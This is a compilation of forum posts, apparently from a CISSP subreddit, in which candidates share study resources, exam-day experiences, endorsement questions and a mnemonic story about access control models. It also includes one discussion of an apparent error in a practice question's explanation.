The Sybex content prepared me for the technical part of the exam, the questions on Study Notes and Theory as well as How to Think Like a Manager and CISSPrep.net prepared me for the manager mindset. Mike Chapple’s LinkedIn CISSP class put everything together for me.

Those were my top three resources! But I needed all of them to pass!

I have just over 3 years experience overall, all in InfoSec right out of a Masters in CS (non-technical undergrad), so planning to take CISSP exam right around 4 year experience mark so I can officially get endorsed.

How near to passing is ‘near proficiency’ 

I just wish they gave me a little more breakdown of how close I was exactly. I have been studying for the past 6 weeks( min. 4 hours a day) one week was a boot camp.

My organization paid for an ISC(2) bootcamp and I had a fantastic instructor who provided excellent examples of ""demystifying"" complex subjects like encryption algorithms and frameworks.  I attended the bootcamp last week.

I only used the book as referenced by my bootcamp instructor and then occasionally during the ISC(2) official practice exams to review information that I missed.  I didn't read it cover-to-cover.

I also paid for a month subscription to the PocketPrep app to gain access to all of the questions and just hammered practice questions at night between my bootcamp last week and my exam this morning.

It stopped me at 100q after about 100 minutes.

I think experience had the biggest role in me passing.  I've done most everything covered by the domains, but there's also definitely a ""mindset"" that you have to put yourself in when you take the exam.  It was the same for the CISM.

I am so relieved to have it behind me... and want to encourage those of you that are planning to take it, book the exam now.  Having that ""deadline"" helps with the mental aspect of prepping.  You HAVE to do it if you have an exam appointment.

I have been working in cyber security roles for well over 6 years the financial services industry. I studied very casually the Sybex book for about  4 months on and off for an hour or two a day. I do not consider myself technically minded at all or have been in technical roles.  I didn't feel good about a-lot of the questions, but was able to at least choose between two responses where I felt reasonably comfortable.

I know there are a ton of threads in here that state a lot of study materials. However, I wanted to make a post and ask for the top two study materials for the CISSP. I am currently in Grad school with a focus in Cybersecurity and have been working as a Analyst for the past 2 years. The only certification I have as of currently is Sec+, but this is mainly just due to time constraints. I am looking to take the test around this time next year. If you all could chime in with the best two study options that would be great! I don't mind spending some money for some good stuff.

3187,otq9aj,About a question from the Wiley CISSP test bank...,"Greetings everyone. I attempted the Bonus Exam from Wiley's Test Bank today, and one of the questions asked about a packet analysis scenario.

The questions goes like this:

>While performing network packet capture analysis, you discover packets that seem odd. By looking into the packet’s raw hex display, you see that the byte offset position 0x2F has the value of 0x08. What was this packet attempting to make occur?  
>  
>A. Abruptly disconnect a session  
>  
>B. Confirm the receipt of a data set  
>  
>C. Start a graceful hang-up process  
>  
>D. Initiate a new session connection

I pick A, the answer that this shows a reset, to abruptly end the connection, and Wiley says I'm right. It provides the following explanation which I'll copy and paste here:

>The raw hex value of 0x08 in offset position 0x2F represents the binary number of 00000100. When this binary number is compared to the TCP header flag (i.e., the offset position 0x2F) layout of XXUAPRSF, it is clear the Reset flag is set. Thus, this packet is attempting to abruptly disconnect a session.

This seems strange, because 0x08 is binary 00001000, so the explanation is one position off.

The layout of the control bits is correct, XXUAPRSF, and RST is indeed 00000100. But, that means the hex value should be 0x04 in both the question *and* the answer / explanation.

Furthermore, the offset position for the TCP header flag should be byte offset 13, i.e. TCP\[13\]. Why does it say offset position 0x2F?

It seems as if Wiley made several mistakes here. Either that, or I am losing my mind. Can you guys weigh in?

One last point is that I hardly think questions like this will appear in the actual exam. Packet analysis seems too far down in the weeds. What do you guys think?",2021-07-29

I have been having the hardest time remembering certain topics in the book, like the access models.

I don't know if this idea is stupid/silly but I'm hoping it will help remember at the least the name and what each model does! The story may sound silly because I am just making this shit up, also my grammar sucks so please excuse me but I will write in a way so that each model is memorable :)

If you all like this, I can write more about other topics, so here goes nothing!

\-------------------------------------

It was a cold winter night in Virginia but it was hotter than ever in Washington DC with cybersecurity incidents across the Federal government. Something had to be done or else the USA was to going to lose the war against its enemies on the cybers fronts. We could beat anyone in physical battle, but how do we beat an enemy who knows no boundaries that you can't shoot or kill by a stealth bomber or a drone?

After being in traffic for hours on 66 East by the Key Bridge near Georgetown, Mr. Bell LaPadula had enough and took the exit near Roslyn to cross the bridge. ""Big mistake"" he explained ""the damn traffic worse up in here!"" After moving an inch every 30 minutes, he remembered why took this exit. He loved the view of the Potomak river, as the sun rose up over Kenndy Center. It was better than looking at a parking lot of cars.

Noticing how late he was running for work, he had no choice but to call his best friend Biba, a goofball who saw Mr. LaPadulla as this big military prick but loved like a brother nonetheless. They have been arguing for days about how to solve these Cybersecurity incidents. His biggest worry was to prevent insider threats, there has been a fear that there are Chinese spies now working in the ranks of the US government, they had found a way to get in and now no one could be trusted, not even our own...

Bell and Biba have been working together with Clark Wilson, an AirForce retire who loved sports cars, more especially Camaros, and their nerdy twin buddies Brewer and Nash who were obsessed with the Great Wall of China, but for some odd reason they always referred to it as Chinese Wall, LaPadulla never asked why... Together they made a great team solving the hardest IT Security problems.

However, Mr. Goguen Mesegur, a kiss-ass who was a title whore in the government world, always got in the way of LaPadulla. No matter how great of an idea he had, Goguen stopped him in order to push his own agenda. His biggest supports were Graham Denning, an IT Manager, and Mrs. Sutherland, an old-school mean lady who smoked way too many cigarettes, the type of person you wondered how she was still alive after smoking packets of cigarettes per day for many many years! If she called, you could even smell the cigarettes from the phone as soon as she said ""hello darling...""

3193,osz1a8,Provisionally passed the CISSP at 100 questions today,"Hello everyone,

&#x200B;

I studied for the exam for maybe 2 days and did a cramming session last night of some quizlet questions, read through eric conrad's 11th hour, reviewed concepts in the official study guide I didn't understand, watched youtube videos, and provisionally passed the exam at 100 questions. Let me start off by saying that I have about 10+ years of experience in InfoSec and most of the success of the exam was really not from the cramming session, but rather my real-world experience. 

&#x200B;

This was by far the weirdest exam I have ever taken. At no time, did I know or feel if I was doing well or not. The questions are worded in a way that many answers could be correct ones and I feel that this is what makes the test **'difficult'** for some. There were a lot of test-taking skills that I applied like the process of elimination and re-reading the question again to ensure I was understanding the question correctly. At the end of the day, I believe my experience and knowledge of infosec acquired over the years is what got me the pass.

&#x200B;

I just want to say you definitely don't want to memorize anything. The cramming session I did overnight was focused on a couple of areas I didn't feel comfortable with and I really just tried learning the concepts. Memorizing will definitely not help you in this test. Definitely need to understand concepts and take the test from the perspective of a 'Risk Consultant'. That really helped me.

&#x200B;

Anyways, I'm happy that I was able to pass and I'm also very thankful for the posts with resources people used to pass the exam that I was able to review the past month. I did use some. 

&#x200B;

Here's my list of resources that I used this week:

\- Eric Conrad's 11th Hour **( Read book overnight and today before exam, its a super quick read and very helpful)**

\- Sybex Official Study Guide **( reviewed only concepts I didn't understand quickly)**

3194,oswpx3,CISSP endorsement questions,"I'm currently studying for my CISSP and have some questions about who can actually endorse me.

I thought I just needed to prove 5 years of experience in the domains covered, I didn't realize that the person endorsing me has to also be ISC certified.

I am part of a two man IT team and would've had my boss endorse me. the scope of my job very much includes security.

However, while I have 5 years of security experience, my boss is not an ISC member. I'm also not particularly looking to jump ship once I'm certified (though id make a lot more money if I did.) How do I get my skills endorsed when I pass the CISSP exam?

Can my boss endorse me without a CISSP himself?

Can I be endorsed by a third party ISC2 member? If so, what will I need to show them to prove my experience?

For example, in the past five years I have:

- earned a CRTP certification

- built and tuned a SIEM solution based on graylog, elasticbeats, sysmon, and graylog sidecar. This system uses SIEM rules translated from the sigma project (to which I am a github contributor)

- developed the incident response plans and playbooks for our organization (a few hundred pages worth)

- planned and implemented CCTV and access control systems for all of our sites...

- ... along with matching surveillance and privacy policies specific to our region (were a govt agency subject to strict privacy laws)

- top 500 member of hackthebox.eu since 2017

- set up and perform monthly vulnerability assessments

- replaced all our firewalls and audited their rules and configurations

- wrote the RFPs for several new projects (including disaster recovery)

- been the primary responder to several ransomware incidents (at my previous job at an MSP)

- Developed security awareness programs for our staff (both knowbe4 and live demos such as demonstrating USB HID attacks to staff)

- formally specialized in infosec during my computer science degree

- write infosec articles in my spare time, several of which have been cited by large organizations including infosecinstitute (not that i like infosecinstitute, but whatever)",2021-07-27

3200,orz3bf,5 Tips For Passing The CISSP Exam,"Thought I’d share some of my top tips for passing the CISSP exam.

**#5 Read and Relate**

“I don’t understand, I read the Shon Harris book 3 times! How did I fail the exam?”

You read The Odyssey.

You read The Old Man and The Sea.

You read To Kill A Mockingbird.

You don’t read a CISSP study guide.  You must relate and understand a CISSP study guide.

Software Development Security was my weakest domain.  I’d turn my computer speakers up, and listen to a 2-hour video about Software Development Security on YouTube or CBT Nuggets.  Then, I’d proceed to forget everything in three days.  I don’t create software for a living, which is why I had a tough time relating the Software Development Life Cycle (SDLC) to the real world.

But I did work in network security for a living.  A job in which I applied cryptography concepts into action through the use of VPNs and SSH every single day.  This is why cryptography became my strongest domain, I had the ability to relate what I read in CISSP study guides.  I’d read about symmetric and asymmetric encryption, and then apply it for customer devices and environments.  It was awesome.

In an effort to increase my knowledge about the SDLC though, I Googled and YouTubed all I could.  I’d Google things like “iphone software development process”, or “SDLC process used by Facebook”.  I’d read about these real world examples to better relate it to the CISSP books.

I found out too late that the CISSP is actually not a memorization test, it’s a test of concepts.  Keep that in mind as you study!

**#4 Obsess**

“I tried to make the game perfection” – Michael Jordan

How do you get good at something? You have to keep doing it over and over again.  If you want to be a good basketball player, you gotta put in hours shooting in the gym, learning how to dribble tighter, run faster, and shoot more accurately.  Michael Jordan obsessed over the game, and went on to become a basketball legend, and accumulate an estimated net worth of $1 BILLION!

Michael Jordan was the totality of all his training.

I remember obsessing so much over the CISSP that sometimes I neglected my friends, family, and general hygiene.  When obsessing, it’s hard to let go.   While driving, going to sleep, or eating, my obsessive subconscious would still think of a problem, and continue to work on it.

Obsession can be dangerous mentally, but with proper control, it can be an effective productivity tool.

Luckily, you can start the obsession phase 2 months before you take the actual exam.  This is the time to sleep, breathe, and eat CISSP.  Just study it everyday right up until the exam so everything stays fresh in your brain.

**#3 Write**

Not type. Not email.  Not text.

Write.

Pencil and paper.

Read about vulnerability testing, and then draw out a network topology map and place the firewalls, IPS, IDS, and servers where they should belong.

Read about system ring architecture, and actually sketch the proper and secure path for a system process.

Read about the OSI Model and actually draw out how a packet starts at the application layer on Host A, and travels up the layer to Host B.

Let the information you read, flow from your brain, through your arms, and to the tip of your pencil.  When you get a question about a packet having issues at the network layer on the exam, your brain will recall back to your hand motion of writing about it on a piece of paper.

**#2 Trust Yourself**

Before actually taking the exam, all I heard was that the CISSP was an incredibly tough exam.  This was in the days of the 250 questions and 6 hours of total mess-with-your-mind torture exam.

This is true.  But I’m here to tell you that it is a completely passable exam! It’s not that difficult.  The only way to do it is to follow the same formula as everyone else who has passed.  Get some real life security experience, study the Shon Harris books, take an ungodly amount of practice exam questions, and mentally prepare yourself to sit in an exam room for a prolonged period of time while being mentally tested.

After completing about 180 questions during the exam, I actually started to feel fairly confident that I will pass.  Before taking the exam, I felt 60% confident that I’d pass, even though I studied for 10 months.  It is only after passing, that I realized I should’ve trusted myself 100%.

I’m trying to boost your confidence now, and not after the exam.  If you study well, you will be a CISSP.  It is not that difficult.

If you understand the concepts, and can truly see the big picture as it relates to information security, and have done your best to study for the exam, then trust yourself.  You will pass.

**#1 Don’t Give Up**

The alarm rings at 8:00 a.m., but it’s your day off.

You came home from a tough week of work, spent time with your family trying to hide your exhaustion, then finally collapsing into bed.

You deserve some rest.

Then your brains reminds you about that alarm you set early in the morning.  You still have an exam to take in 5 weeks.  You may have failed it the first time, but you’re definitely not going to fail it the second time.  You still have to read more about Common Criteria and Spanning Tree Protocol.  You still need to nail down all the steps in a forensic investigation process.

I can tell you not to give up a million times.  I can tell you that dedicating yourself to study for the CISSP is the only way to pass the first time, but it’s ultimately your decision.

Don’t give up.",2021-07-26

3204,or002m,Obligatory “provisionally passed” post,"Full disclosure: I earned a CISSP cert around 2003-04 that I held for 6 years and then let lapse. I wasn’t in a security-focused role in the job I’ve held for the last 16 years, and keeping up the CEUs wasn’t worth it. That being said, the CBK and the exam - as well as the industry in general - are radically different than they were then and I’ve never been in a “traditional” security role. My earlier test was the 6 hour paper exam on 10 domains that had very little overlap unlike the current 8. 

Prep: 1 month, OSG 8th edition, sample test companion book, ITPro.tv subscription (accelerated 2018 version, 2021 came out just before my test), mind map and exam cram YouTube series. I also credit Harry Lorayne and Josh Foer for the memory techniques that I made extensive use of in my studies.

If I had to prep over again I would’ve done the mind map series first before starting ITProTV and OSG. It would’ve given me a better 360 and a place to hang the specific concepts as I picked up more detail.

The adaptive testing is no joke. I honestly had no idea how well I was doing, or whether I was going to pass or fail when I got my results. I had no idea which questions were evaluated, and TBH was often not sure whether I knew the answer or not. I would have probably dreaded my results and felt like giving up if I hadn’t seen [this video](https://youtu.be/5nqqL1rjIY4). If you’re used to acing paper exams this will feel awful.

Top advice, spend as much time as you can in the [Certification Station](https://discord.gg/certstation) Discord channel. There you will find both what's the proper material, and relevant and authoritative discussions about the different topics.

I've compiled which sources I used in this [LinkedIn post](https://www.linkedin.com/posts/lucianovaschetti_today-i-defeated-the-beast-after-100-activity-6823330484798423040-ox-X)

&#x200B;

Although it's a Manager exam, it evaluates technical content, so you have to be comfortable with the vocabulary and how the technology works. That said, technology is not the most important to be evaluated.

As I've been told, there are really weird questions (although related, of course)

New topics come up, but being aware of them and knowing the inch deep is enough.

It's not worth memorizing anything (and I didn't), but understanding and being able to talk about the major processes (BCP, BIA, DRP, IR, SDLC)

Time wasn't an issue with the exam. On the contrary, 100 minutes were left, even without rushing into any question. Taking a few breaks to go to the bathroom and drinking water was really helpful.

The last days I relaxed and took walks while listening to Rob Witcher's mindmaps, and listening to different mindset videos on Youtube (Kelly, Larry, Seth Misenar / Eric Conrad)

&#x200B;

These videos helped me a lot, to be in the ""Think like a Manager"" mindset, I watched them several times:

[https://www.youtube.com/watch?v=v2Y6Zog8h2A](https://www.youtube.com/watch?v=v2Y6Zog8h2A)

[https://www.youtube.com/watch?v=HWg2geVJuvs](https://www.youtube.com/watch?v=HWg2geVJuvs)

[https://www.youtube.com/watch?v=dq5eodSz\_0k](https://www.youtube.com/watch?v=dq5eodSz_0k)

&#x200B;

Something really helpful was to print the Exam Essentials from OSG 9, and reviewed them all, marking and putting comments to anything I wasn't sure about.

So, covering 100% of the topics (without memorizing anything like cable speeds) + a good mindset = being comfortable at the exam room.

Also, before entering the exam room, I took 5 minutes for myself and breathed with my eyes closed, listening to this one: [https://www.youtube.com/watch?v=AtF0T2fPvbI](https://www.youtube.com/watch?v=AtF0T2fPvbI)

&#x200B;

As for the questions in the exam:

\- Some of them were really direct /easy/straightforward (e.g. ""what's best for accomplishing ***this***). These ones would be like Boson.

\- Some of them were hard, in the sense that the purpose was hidden (they used other words different than the ones we're used to (e.g: Privacy instead of Confidentiality). These ones would be like Thor's

\- Some of them were really weird (assume most of that ones were non-graded) and I'd tried my best. These ones would be like Wentz's

I think there were 1/3 of each of those groups. Really, some of them weren't that hard

But.. for the first group, I had a (simple) networking question, or access control model questions, that if I didn't know the knowledge couldn't have answered.

3211,opmbh7,"Provisionally Passed 100 Questions, 2 Hours","It seems customary to post a pass here, and since others' success stories have inspired mine, thought I would give my 2 cents as well.

I would consider myself one of the less experienced coming into the exam, am currently a post-graduate student finishing up Masters in 4 months, and zero work experience outside of an internship. 

Started 4 weeks ago using the following:

**Study Materials**

* [Sunflower CISSP Summary](https://docs.wixstatic.com/ugd/dc6afa_fc8dba86e57a4f3cb9aaf66aff6f9d22.pdf) by Maarten de Frankrijker
* CISSP Exam Cram by [Inside Cloud and Security](https://www.youtube.com/channel/UCAr0yk0um7lwLjmrKfzwyig)
* [Destination Certification](https://www.youtube.com/channel/UCXk6whiDrWq42y9Tdv1MEhg) summary videos
* Google

CISSP Exam Cram came first, and after finishing all 8 domains and doing a few questions, I watched Destination Certification videos as a refresher. Sunflower CISSP Summary was mostly used as reference material, alongside Google.

**Practice**

* CISSPrep

Comparing the style, CISSPrep questions were very similar to the questions I got during the certification tests. Its pretty affordable as well. Some questions there are worded poorly, or have bugged options (especially for the drag and drop, somehow it doesn't record your selections properly), and some questions that I got wrong were not very well explained by them. However, it did a proper job in training me to focus on what's important when reading and answering questions (think like a manager).

I would say that results for practice tests don't really matter (unless you're getting below 40-50%), what's important is what you get from it. I was scoring 60-65% on the CISSPrep mock exams the day before the test.

**Pre-Test/Pre-Practice**

*  [CISSP Testing Tips Secrets All Students Should Know](https://www.youtube.com/watch?v=CanT50bzEV0) by Andrew Ramdayal
*  [Why you will pass the CISSP](https://www.youtube.com/watch?v=v2Y6Zog8h2A) by Kelly Handerhan

Having little work experience, these 2 videos were vital in getting me into the correct mindset when doing practice questions, and sitting for the test. Watch them once before doing practice tests, and as many times as you want before you sit for the test, I feel it really helps.

**The Test**

It wasn't as hard as I expected it to be. Questions were pretty clear in explaining scenarios, just make sure to read carefully and read all the options. Many times I changed my answer at the last minute after realizing I read the question/options wrong or too quickly.

It was a wild 4 weeks for me with many lows, and not many highs, and I wish whoever who is preparing for their upcoming test all the best. Make sure to get enough rest the day before, and eat well (but not too well) to last the entire duration of the test.",2021-07-22
3212,opked7,CISSP Experience,"This forum helped me quite a bit and hence thought to update my experience for the benefit of the community and offer credit to the immense learning resources on the web

About me: Over 10 years in IT / Risk / Cyber.  

**Prep:** About 3 months, initially about 1 hour / day followed by 3-5 hours of revision in the last 2 weeks.

The following resources help strengthen my concepts (A big thanks to all of them):

· Thor Teaches

· Kelly videos

· Official study guide and practice questions

· CISSP mind maps on YouTube ([https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s](https://www.youtube.com/watch?v=6X4A6B94vmw&t=101s))

· Reddit and ISC forum

· Reviewed the ISC practice questions once but did not attempt any more practice exams since I ran out of time. 

**Exam experience:**

Like most of the commentators before me mentioned, the questions were not straight forward, and I had no clue if the answer was correct. In fact, I tried looking up the answers to some of the questions I recalled at home but struggled even with Google! Some domains had more questions than others. I planned to take a break after 100 questions, but the exam ended on the 100th question with 1hour to spare. I did not look at my transcript until I was out of the centre  and was pleased to have provisionally passed. 

**Top Tips:**

Read the question and identity key words such as “Which solution”, “What comes first” etc. This should help filter out some of the answers. 

There is a lot of material out there and found additional value in each of them. Since the scope of CISSP is huge you will need to refer multiple sources.

If I had to prepare again, I would try to cover as many topics as possible and answer the following question with 1-line answers. What, Why and How. I don’t think it is necessary to go in depth and unnecessary details. Focus on concepts and understand why some of the technologies actually exist, their vulnerabilities and remediation. Use practice tests to re-in force these concepts and not as a barometer of your performance in the exam.   

Hope this helps :)",2021-07-22
3213,oph7oz,How do you complete your continuing ed credits?,"I am a fairly new CISSP and I am starting my continuing education credits now. So far I have done some express learning on the ISC2 website as well as some BrightTalk videos.

3214,opgpgp,"Passed CISSP, 100 Q, <1 hour","I (provisionally) passed my CISSP exam, 100 questions, under an hour (I believe 51 minutes?) and I *significantly* over prepared. I don't say this as bragging, but as a touch-point so others might have a guide of ""what's enough"" and ""what's *too* much."" Also looking back on my journey is through the lens of what I know now, I might be overly critical of some resources. *To that end* I may be over-critical of some resources as not being helpful, but as it's difficult to divorce my viewpoints from my perspective to that end, I'll just give you as honest-as-possible evaluation of what I used.

My main takeaway is: The most productive parts of my journey were a tight feedback loop of practice exams, identifying weak points, studying, and repeat. 

# Before CISSP

I have \~9 years of IT/technical experience, 4+ of which was a wide-spread role containing cybersecurity, IR, limited forensics, DLP, and security tool administration. The last 9-10 months have been as a Cloud Security Architect. All of this has been at the same organization, a Fortune 100 enterprise.

Previously I've obtained the following certifications that the studying of helped (at least in part) for the CISSP:

* Security+
* SANS GCIH
* CEH (Masters)
* Cloud+
* AWS Certified Cloud Practitioner
* AZ-900
* AZ-104

In addition I took the OSCP class, and worked some of the labs, but did not attempt the exam. Retaking the class and reattempting the exam is a 2022 or 2023 goal for me.

# Studying for the CISSP

I began with the 11th hour. I guess it was nice, but it felt way too high level. I know a lot of people say this is a great last-minute prep, but I really can't agree with that. It was so high level and detail-lacking I can't really see the value. I guess it was a nice first pass? In hindsight, the [CISSP Mindmap video](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) series would have been a much better first pass. Note, I didn't study the 11th hour, just read through it once.

I also listened through, twice (just because it was long-car-trip material) the [Essential CISSP by Phil Martin, Second Edition](https://www.amazon.com/Essential-CISSP-Exam-Guide-Knowledge/dp/B07JDJV47Z). I thought it did a decent job, and if you would like to study during car trips, it's the best audio book I found. I tried some others, but I wouldn't recommend them.

Next I went through a period of practice exam, official study guide, rinse, repeat. The first practice exam I took was the OSG's companion exam, then my three worst chapters in the OSG, then BOSON A, then the half-dozen worst chapters in the OSG (which did see some overlap), then BOSON B, the worst 3 chapters *and* the OSG's domain exams over the three worse domains, then BOSON C. I made notes along the way and reviewed the notes. I did all BOSON exams in ""study mode"" and if I missed the question I would screenshot the relevant parts of the explanation and added it to my study material. For the OSG practice exams, I would review the missed questions and also produce notes from them. All of my notes I went over at least twice, sometimes as many as six times. This being said by the time I had finished this, half of the OSG hadn't been touched, and I did not exhaust either the OSG practice exams (or close to it) or the BOSON exams. However the exams were different, so I would recommend both.

As a small aside, all of my study material was for the previous version of the CISSP. I did not feel like this left me ill prepared for the new version to any extent whatsoever.

Another small aside, I did watch a hodgepodge of videos on YouTube to focus in on any topic I felt uncomfortable with. My total time watching such videos was <6 hours, including repeating videos.

I also watched ""[Why you WILL pass the CISSP](https://youtu.be/-99b1YUFx0A)"" and read through [How To Think Like a Manager](https://www.amazon.com/Think-Like-Manager-CISSP-Exam/dp/1735085197/ref=sr_1_3?dchild=1&keywords=Think+like+a+manager&qid=1626967662&sr=8-3) during the weekend before my exam. I think they were both important, and added value. *However* I feel like the mindsets pushed in these study materials--*while valuable in the real world*\--weren't as important to the CISSP as they made it out to be. Still, do yourself a service and go through both of them.

Near the end of my preparations, I noticed I would read a practice question, and be able to *sometimes* articulate why two different answers were correct. Not in a ""these are both good answers, but I need to pick the best of the two,"" sort of way, but as a critique of the question author sort of way; I could display a deeper understanding that showed I understood the question; I was able to articulate an important security or business consideration that made it easy to justify multiple answers without more information. Thankfully on the actual exam I only came across one quesiton where I felt like I needed more information.

This level of understanding was probably the best sign I had that I was ready for the CISSP.

I was willing to accept if I picked a wrong answer in BOSON, the OSG exams, or Think Like a Manager, but about 1/3 - 1/5 of the time when I got a wrong answer I felt like I had a valid critique of the question, I would count myself as having gotten that question right. To that end, I was scoring about 85% on my last BOSON exam (first time taking the exam, I never repeated BOSON exams) and \~75% on my OSG ""trouble domains"" (domains where I was needing the most studying).

Lastly I will say please avoid the ""Inside Cloud and Security"" CISSP exam cram. I really hate saying this since his videos are engaging, clear, and generally well explained, however they suffer in three key ways. First what he decides to talk about feels like a patchwork of topics within the domain--or at least that's my view after having studied the domains--rather than a complete picture. Second, he often skips pass topics with a quick definition that really aren't valuable to you during the exam without actually understanding the topic, so it might give a false sense of readiness. Third, and most importantly, some things he says are outright wrong, which is dangerous for the exam. It felt like he got things that were more academic and less practical wrong, which makes sense given that he admits he did very little studying and depended on his extensive industry experience. 

# Final Thoughts/Summary

So the biggest reason I typed all of this up is to provide some context as to how to slam dunk the exam, and when you probably will slam dunk the exam. It also seems people are very hesitant in saying what % of practice exams will see that you pass, so here's my guide:

You're certainly ready to take the exam:

* When you're getting 80%+ on BOSON *from understanding the questions and not rote memorization.*
* When you're getting 75%+ on the OSG comprehensive exams *from understanding the questions and not rote memorization.*
* When you're getting 70%+ on the OSG domain-specific exams for your weakest trouble areas *from understanding the questions and not rote memorization.*
* After you go through the provided ""Think Like a Manager"" materials
* You have gone through all of the questions you missed, understand why you missed them, and spent time understanding accompanying material (if you miss a question about why a certain encryption technology is a bad choice in a specific situation, and another is a good choice, study both technologies in a broader sense, and loop in a third, forth, etc, technology that might be comparable)

This was where I was at, and, again, I was more than ready for the exam. Actually during the exam do basic good test taking skills such as ""carefully read the question, make sure you understand it, eliminate two answers,"" etc.

Also I will say the OSG exam *and* BOSON had questions that were grossly in the weeds such as ""you need to network two devices over X distance and you need Y speed. What Ethernet cable would you need?"" or ""A user is currently using 802.11(whatever). They want to upgrade to X speed. What 802.11 technology would your recommend?"" 

Do NOT worry about memorizing any tables of raw numbers like these. I saw NOTHING on the exam that was that in-the-weeds. Plenty of technical or semi-technical questions, but no rote memorization of numbers. In real life this is something you can certainly look up, or you deal with so regularly that you'll learn it as a matter of course.

I'd be happy to answer any questions that I can that respect the CISSP NDA.",2021-07-22
3215,ooy5bj,My CISSP journey from zero to passing with some obstacles," **My CISSP journey:**

I started studying at the beginning of 2019, inspired by some posts on reddit and the fact that the content of CISSP is very interesting for me and my further career steps. I spent about 3 months reading the Official Study Guide (OSG), researching a lot of content and taking lots of notes, and in the meantime, I was very confident that I would pass the exam.

However, in the middle of 2019, I stopped studying because I got an interesting job offer in security that required a bit more attention. So I decided to take a break and catch up on the OSG sections from time to time. 

In early 2020, I met a work colleague who has already passed the CISSP exam, he gave me some tips on good sources to continue with my studies. Later I will give a brief overview of the sources that helped me. I started studying seriously for a second time. This time with Thor and Kelly while I was driving. In the evenings I read the OSG and the latest Sunflower PDF to have a lot of information in a condensed form. Later in the year I ordered the Boson question bank and the OSG practice exam to practice some questions. In the beginning, I regularly scored 75% and reread my weak topics.

I booked my first exam in Germany, Düsseldorf for December 2020, due to Corona the test center was closed. The next possible date for the exam was in February 2021, this date was also cancelled. The next test date was then in April 2021. If I didn't pass the exam on that date or the test was cancelled again, then I would have to learn the new content because of the content update in 2021. And it happened again, the exam was cancelled again. Now it was clear I had to understand and be able to apply the new content, by 11 July. 

The last weeks before the exam I studied after work in the evenings for about 3+ hours, plus all the weekends. The day before the exam I thought I was ready to take it, but as soon as I saw the first 10 questions, I thought what the hell, I never read about this content. Halfway through, I wasn't very confident that I could pass the exam, but I focused on each question. When I finished the last question, I went to the reception and got my result - **Congratulations!** 

I passed, the CISSP exam.

**The study resources I used to prepare:**

**Cybrary Kelly Henderson:** I like her video training, she is very funny, knowledgeable and a great educator. You get a good and deep overview in her videos, which is easy to understand even as a non-native speaker. A must watch is her video on YouTube ""Why you will pass the CISSP"". 

**Thor Theache's CISSP:** I have seen a few write-ups saying that his content is not very good. But I disagree, his content is a bit expensive but worth watching. He is also a good trainer and sometimes he is available in the discord channel of certification station.

**CISSP for dummies:** I ordered this book and never read a complete chapter. Sometimes I had to re-read some content to get a second or third view of the content. 

**(ISC)2 Official Study Guide - latest version in 2020:** my main study resource, I read this book cover to cover, word for word. It is a good resource to get a good overview of the content, which is really a mile wide and a inch deep. At times I thought it was 1.61 km wide and 2.54 cm deep 😉. But if you ask me if you can pass with just the OSG, I will say, yes, it is possible, but you should take some time to read some other books as well.

**Eleventh Hour CISSP:** I got this book to get a quick overview of all the content that might be necessary in the last week. In hindsight, I would have read this first before going through the official study guide. It gives a good overview of everything to expect in the exam.

**(ISC)2 Official Practice Exam:** You should use the online version of the book, this is more helpful than the paperback. You will need to use the code you get from the paperback to register for the online test bank.

**Boson CISSP Practice Exam:** A lot of questions for a good price, updated regularly. You will need Windows to work with Boson. The questions are very technical and the answers are very well explained so you understand why the questions are wrong. This is a ready important aspect from my point of view.

**Certification Station Discord:** The CISSP channel is absolutely worthwhile. A very good resource that I would recommend anyone to join. Ultimate bunch of helpful people, open 24/7 (because of the international audience). Discussions on various topics have helped me a lot

**Destination Certification Flash Cards:** If you are on a train ride, journey or similar, take these flash cards and just read them one by one. Very helpful in my eyes. I would read them in the middle of my exam preparation.

**Do's and Don'ts:**

\- Register as soon as possible. The examination center in Germany, Düsseldorf is always fully booked at short notice.

\- I have done 4000+ questions.

\- Read correct AND incorrect answers of the question

\- Read the question twice during the exam

\- Do not give up during the exam, even if it looks bad

\- Be a member of a study group (Certification Station)

\- Eat well and do some exercises to have a fresh mind.

My last words, ""Don't talk the talk, walk the walk"" and all the best. I will now rest for a few weeks and then continue with CISA or CISM.",2021-07-21

April-May

Took CISSP SANS Course with David Miller. Loved the course, but wasn't crazy about Miller. There were something he said, that he was so confident in, that I found that were either wrong, or poorly said. He also talked really fast without a quick break. I imagine this might be because of online teaching, but maybe go with one of the course creators. For example, we got hung up on the terminology On-premise, on-prem or on-premises and what the exam would use.

Not to drive into it, but that isn't important, lets discuss the topics, not that on-premise is not correct terminology when talking to IT personel, and at the end of the day, no one cares. However, David Miller was really good diving into the technical points and bringing it all together. If you don't mind some of the small banter, and fast speaking, then go this route.

I would recommend the course, but be weary, everyone is different, and I really believe teachers should be suited to the student.

&#x200B;

SANS then provided Audio w/ Eric Conrad. I used this whenever I could.  A lot of story telling, but when it would drive into the points it was good.

I used Eric Conrads books, which were great. Really helped me drive some points.

In the year, I got A+, Net+, Sec+ and now CISSP, which is way harder than any of the others. I took this exam back in May and failed the first time. So, after this I change my study method, which was just go through the Official guide a few times. 

Although I don't like bootcamps, I did attend one by Technical Institute of America, with Andrew Ramdayal. He is a very good instructor and I used his udemy to pass the sec+ a few months ago. His course really helped me understand the mindset of the question and topics. I then got the new official guide that came out last month made tons of notes. I only used CCCure questions and the the ones from the study guide. 

I think what made the difference is the way you approach the questions. Coming from sec+, you are more direct and this exam is not. Sec+ was always 1 correct choice, this exam some of them had what I taught is 4 correct choice. Andrew Ramdayal, larry greenblatt, and Kelly has the tips you need to pass the exam on youtube. Check them out. Trust me when I say this exam is more of how to select the correct answer than it is about knowing your stuff.

Know why you want to be a CISSP, and let that drive you to studying and preparing to test!
2. Mentally prepare yourself to sit there for 150 questions, when my test went past 100… I immediately got down on myself based off peoples comments of the 100q pass…. This took me a minute to take a deep breath, and get back into it… so just prepare yourself mentally you’re in it for the long haul! After all, a pass is a pass…..
3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
